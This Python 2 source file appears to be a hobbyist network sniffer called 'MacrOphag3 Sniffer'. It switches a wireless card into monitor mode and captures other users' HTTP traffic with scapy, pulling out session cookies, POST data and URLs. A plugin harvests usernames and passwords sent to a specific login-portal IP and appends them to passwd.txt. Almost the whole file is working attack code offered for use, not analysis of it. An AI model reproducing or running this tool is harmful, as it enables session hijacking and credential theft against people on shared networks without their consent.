#encoding: utf8
import requests
from scapy.all import *
from scapy.utils import PcapWriter
import scapy_http.http as http
import re
import time
from Tools import *
import traceback
import sys


class Sniffer:
    AllPackages = 0
    RequestPackages = 0
    CookiePackages = 0
    PostPackages = 0
    
    pic = putColor("""
********************************************************************
* __  __                  ___        _                 _____       *
*|  \/  | __ _  ___ _ __ / _ \ _ __ | |__   __ _  __ _|___ /  %s *
*| |\/| |/ _` |/ __| '__| | | | '_ \| '_ \ / _` |/ _` | |_ \       *
*| |  | | (_| | (__| |  | |_| | |_) | | | | (_| | (_| |___) | %s *
*|_|  |_|\__,_|\___|_|   \___/| .__/|_| |_|\__,_|\__, |____/       *
*                             |_|                |___/      %s*
********************************************************************
"""%(putColor('Tr0y', 'cyan'), putColor('v1.0', 'yellow'),
     putColor('Sniffer', 'green')), 'blue')
    print pic
    
    def __init__(self,
                 iface = '',
                 newiface = 'mon0',
                 filename = '',
                 outputmode = 1,
                 savingPkt = 0,
                 savingPcap = 0,
                 filtermode = '',
                 iHost = []):
	
        self.iface = iface #old interface 
        self.newiface = newiface #a new interface in monitor mode
        self.sign = ['—','\\' ,'|' ,'/'] #stupid thing :)
        self.filename = filename #local pcap filename
	self.sfilename = str(int(time.time()))
        self.outputmode = outputmode #0->don't output, 1->output
	self.savingPkt = savingPkt #0->don't save, 1->save
	self.savingPcap = savingPcap
	self.filtermode = '( tcp[13:1]==24 )' #'tcp[13:1]==24' #only sniff tcp
	self.iHost = iHost
	
	if filtermode: self.filtermode += ' and ( %s )' %filtermode #
	
	if self.savingPkt: InitPktsFile(self.sfilename)
	if savingPcap: self.pktdump = PcapWriter("./Pcaps/%s.pcap" %(self.sfilename), append=True, sync=True)
	    
        if self.iface == '' and filename: 
            print putColor('[!]Offline Mode!', 'green')
	    print '  [-]Filter:', putColor(self.filtermode, 'green')
            pkt = sniff(offline = './Pcaps/' + filename,    
	                prn = self.Collector,    
	                filter = self.filtermode,   
	                store = 0)#DO NOT USING store = 1!!! 
	                          #Or you'll see your memory BOOM
	    print 
	    
        else: self.Init()
	
        self.Exit()

    def Init(self): #Waiting fix
        print '[!]' + putColor('Online Mode!', 'green')

        if self.iface == '' :
            print '  [-]Auto Setting Interface...'
            self.iface = getInterface()
	    
	ip = getLocalIP(self.iface)
	#filter the local ip	    
	self.filtermode += ' and ( ' + 'ip src not ' + ip + ' and ip dst not ' + ip + ' )'
  
        print '  [-]Using interface:', putColor(self.iface, 'green')
	print '  [-]Local Ip:', putColor(ip, 'green')
        print '  [-]Add new interface in monitor mode, named:', putColor(self.newiface, 'green')
	StartIface(self.iface, self.newiface)

        print '[+]%s...' %putColor('Sniffing', 'green')
        try:
	    print '  [-]Filter:', putColor(self.filtermode, 'green')
	    sniff(iface = self.newiface, 
		  prn = self.Collector, 
		  filter = self.filtermode,
		  store = 0) #DO NOT USING store = 1!!!
			     #Or you'll see your memory BOOM
	    print 
		
        except Exception, e:
            if 'permitted' in str(e): 
                print '[x]' + putColor('Run as root', 'red')
            else: 
                print '\r', ' '*150
                print '[X]%s' %putColor('Something went wrong', 'red'), ' '*100, '\n'
		print putColor(traceback.format_exc(), 'white')



    def Collector(self, pkt):
	try: 
	    self.AllPackages += 1
	    #print pkt.summary()
	    if pkt.haslayer(http.HTTPRequest): 
		self.FoundRequest(pkt)
		
		#Use plug-in?
		if '10.255.44.33' in [pkt.src, pkt.dst]: self.Plugin(pkt, 'pwd')	    
		
	    print '\r  [%s]' %self.sign[self.AllPackages%4] + putColor(
		'AllPackages %d' %self.AllPackages, 'white'), '  ' + putColor(
		    'RequestPackages %d' %self.RequestPackages, 'blue'), '  ' + putColor(
		        'CookiePackages %d' %self.CookiePackages,'cyan'), '  ' + putColor(
		            'PostPackages %d' %self.PostPackages, 'yellow'), '  ',
	    
	    Clear()
	    if self.savingPcap: 
		try:
		    self.pktdump.write(pkt)
		except: pass
		
	except Exception, e:
	    if 'ascii' in str(e): pass
	    else: 
		print e
		kill
	

    def FoundRequest(self, pkt):
	if self.Plugin(pkt, 'fhost') == False: return 
        self.RequestPackages += 1
        if pkt.Cookie: self.FoundCookie(pkt)
        if pkt.Method == 'POST': self.FoundPost(pkt)

         
    def FoundCookie(self, pkt):
        self.CookiePackages += 1
        self.ExtractInfo(pkt, 'Cookie')

    def FoundPost(self, pkt):
        try:
            if pkt.load != None:
                self.PostPackages += 1
                self.ExtractInfo(pkt, 'Post')
                
        except Exception, e: 
	    e = str(e)
            if 'load' not in e:
                self.PostPackages -= 1
	    
		if 'byte' not in e: 
		    print '\n[X]%s' %putColor('Something went wrong', 'red'), ' '*100, '\n'
		    print putColor(traceback.format_exc(), 'white')
		    sys.exitfunc = self.Exit
		    sys.exit(1)

 
    def ExtractInfo(self, pkt, method):
	info = ['[!]Found %s' %method]
	info.append('[+]From %s to %s' %(pkt.src, pkt.dst))
	info.append('  [-]Method: %s' %pkt.Method)
	try:
	    ua = re.findall('(User-Agent: .+)', str(pkt.payload))
	except: ua = '' 
	
	if ua: info.append('  [-]%s' %ua[0])
	else: info.append('  [-]User-Agent:')
	info.append('  [-]Host: %s' %pkt.Host)
	info.append('  [-]Url: %s' %(pkt.Host + pkt.Path))
	if method == 'Post': info.append('  [-]PostDatas: %s' %pkt.load)
    
	if pkt.Cookie == None: pkt.Cookie = '' 
	info.append('  [-]Cookie: %s' %pkt.Cookie)     
	info.append('-'*60 + '\n')    
    
	if self.savingPkt: 
	    SavePkts('\n'.join(info), method, self.sfilename, pkt.src, pkt.Host)
	    
        if self.outputmode:
	    if method == 'Cookie': colormethod = 'green'
	    else: colormethod = 'cyan'
	    
	    info[0] = '[%s]Found %s' %(putColor(time.strftime("%H:%M:%S", time.localtime()), 'white'), putColor(method, colormethod))
            info[1] = '[+]From %s to %s' %(putColor(pkt.src, 'blue'), pkt.dst)
            info[4] = '  [-]Host: %s' %putColor(pkt.Host, 'green')
            info[5] = '  [-]Url: %s' %(pkt.Host + pkt.Path)
	    
	    num = 6	    
            if method == 'Post': 
		info[num] = '  [-]PostDatas: %s' %putColor(pkt.load, 'yellow')
		num += 1
		
            if pkt.Cookie == None: pkt.Cookie = '' 
            info[num] = '  [-]Cookie: %s' %putColor(pkt.Cookie, 'yellow')
            print '\r' + ' '*200 + '\n' + '\n'.join(info),

	
    def Plugin(self, pkt, plugname):
	#Your plug-in in ./Plugin
	#Such as: mode name is PPPPPPPrint
	#Then you should use: 
	#import Plugin.PPPPPPPrint
	#
	if plugname == 'pwd':
	    import Plugin.getWLANPwd as Pwd
	    try:
		UnamePwd = Pwd.getWlanPwd(pkt)
	    except: pass
	    
	    if len(UnamePwd) > 2:
		print '\a'
		print '[%s]Got Uname and Pwd' %putColor(time.strftime("%H:%M:%S", time.localtime()), 'white')
		print '[+]From ' + putColor(pkt.src, 'blue')
		print '  [%s]' %putColor(UnamePwd[0], 'green')
		print '  [-]Username: %s' %putColor(UnamePwd[1], 'yellow')
		print '  [-]Password: %s' %putColor(UnamePwd[2], 'red')
		
		with open('passwd.txt', 'a') as fp: 
		    fp.write(pkt.src + ' ' + ' '.join(UnamePwd) + '\n' + '-'*50 + '\n') 

	elif plugname == 'fhost':
	    flist = [
	    ] #filter these hosts
	    
	    if re.search('(%s)' %')|('.join(flist), pkt.Host): return False
	    return True
    
    
    def Exit(self):
	print '\n[!]Shutting Down...'
        if self.filename == '': 
	    print '  [-]Down %s...' %self.newiface
	    print '  [-]Del %s...' %self.newiface	    
	    ShutdownIface(self.newiface)
	
	if self.savingPkt: 
	    print '\n[!]Analysing data...'
	    Analysis(self.sfilename, self.iHost)	    
	    print '\n[*]The name of Pkts dirPath is: ./Pkts/%s/' %putColor(self.sfilename, 'green')
	    Abandon(self.sfilename, 'pkt')# Abandon this Pkts and Pcap?
	    
	if self.savingPcap: 
	    print '\n[*]The name of Pcap is: ./Pcaps/%s' %putColor(self.sfilename, 'green')
	    Abandon(self.sfilename, 'pcap')# Abandon this Pkts and Pcap?
	    
	print '\n[!]All Done!'
	print '[*]' + putColor('Have a nice day~ :)', 'green')		
	

iHost = [] #highlight these hosts

Sniffer(savingPkt = 1, savingPcap = 1, iHost = iHost)
#Sniffer(filename='1520213012.pcap', savingPkt = 0, iHost = iHost)

